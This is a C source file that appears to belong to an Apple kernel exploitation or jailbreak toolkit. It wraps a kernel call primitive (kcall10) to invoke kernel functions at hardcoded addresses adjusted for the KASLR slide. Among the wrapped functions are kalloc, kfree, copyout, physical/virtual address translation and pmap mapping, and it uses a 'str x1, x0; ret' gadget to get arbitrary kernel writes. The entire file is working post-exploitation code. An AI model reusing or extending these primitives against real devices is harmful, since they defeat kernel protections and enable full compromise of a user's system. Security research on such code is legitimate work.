#include "kfunc.h"
#include "kextrw.h"
#include "offsets.h"
#include <stdio.h>

uint64_t kfunc_kvtophys(uint64_t va) {
    uint64_t kr = kcall10(ksym(KSYMBOL_kvtophys), (uint64_t []){ va }, 1);
    return kr;
}

uint64_t kfunc_phystokv(uint64_t pa) {
    uint64_t kr = kcall10(ksym(KSYMBOL_phystokv), (uint64_t []){ pa }, 1);
    return kr;
}

uint64_t kfunc_kalloc_external(uint64_t kalloc_sz) {
    uint64_t kaslr_slide = gKernelBase - VM_KERNEL_LINK_ADDR - 0x8000;
    uint64_t kalloc_external_func_off = 0xFFFFFE0007F0D0E8 + kaslr_slide;

    uint64_t kr = kcall10(kalloc_external_func_off, (uint64_t []){ kalloc_sz }, 1);
    return kr;
}

uint64_t kfunc_kalloc_data_external(uint64_t kalloc_sz, uint64_t flags) {
    uint64_t kaslr_slide = gKernelBase - VM_KERNEL_LINK_ADDR - 0x8000;
    uint64_t kalloc_data_external_func_off = 0xFFFFFE0007F0D104 + kaslr_slide;

    uint64_t kr = kcall10(kalloc_data_external_func_off, (uint64_t []){ kalloc_sz, flags }, 2);
    return kr;
}

uint64_t kfunc_kfree_external(uint64_t kptr, uint64_t kalloc_sz) {
    uint64_t kaslr_slide = gKernelBase - VM_KERNEL_LINK_ADDR - 0x8000;
    uint64_t kfree_external_func_off = 0xFFFFFE0007F0DE14 + kaslr_slide;

    uint64_t kr = kcall10(kfree_external_func_off, (uint64_t []){ kptr, kalloc_sz }, 2);
    return kr;
}

uint64_t kfunc_copyout(uint64_t kaddr, uint64_t udaddr, size_t len) {
    uint64_t kaslr_slide = gKernelBase - VM_KERNEL_LINK_ADDR - 0x8000;
    uint64_t copyout_func_off = 0xFFFFFE000861DED8 + kaslr_slide;

    uint64_t kr = kcall10(copyout_func_off, (uint64_t []){ kaddr, udaddr, len }, 3);
    return kr;
}

uint64_t kfunc_kwrite64(uint64_t kaddr, uint64_t val) {
    uint64_t kaslr_slide = gKernelBase - VM_KERNEL_LINK_ADDR - 0x8000;
    uint64_t str_x1_x0_ret_off = 0xFFFFFE00095F6DEC + kaslr_slide;

    uint64_t kr = kcall10(str_x1_x0_ret_off, (uint64_t []){ kaddr, val }, 2);
    return kr;
}

kern_return_t kfunc_pmap_enter_options_addr(uint64_t pmap, uint64_t pa, uint64_t va)
{
	while (1) {
        // uint64_t kret = kcall8(ksym(KSYMBOL_pmap_enter_options_addr), pmap, va, pa, VM_PROT_READ | VM_PROT_WRITE, 0, 0, 1, 1);
        uint64_t kr = kcall10(ksym(KSYMBOL_pmap_enter_options_addr), (uint64_t []){ pmap, va, pa, VM_PROT_READ | VM_PROT_WRITE, 0, 0, 1, 1}, 8);
		if (kr != KERN_RESOURCE_SHORTAGE) {
			return kr;
		} 
	}
}

uint64_t kfunc_pmap_remove(uint64_t pmap, uint64_t start, uint64_t end)
{ 
    uint64_t kr = kcall10(ksym(KSYMBOL_pmap_remove_options), (uint64_t []){ pmap, start, end, 0x100, 0, 0, 0, 0 }, 8);
    // uint64_t val = 0x4141414141414141;
    // uint64_t kr = kcall10(ksym(KSYMBOL_pmap_remove_options), (uint64_t []){ val, val+1, val+2, val+3, val+4, val+5, val+6, val+7, val+8, val+9 }, 10);
	return kr;
}

uint64_t kfunc_pmap_find_pa(uint64_t pmap, uint64_t va)
{ 
    uint64_t kr = kcall10(ksym(KSYMBOL_pmap_find_pa), (uint64_t []){ pmap, va }, 2);
	return kr;
}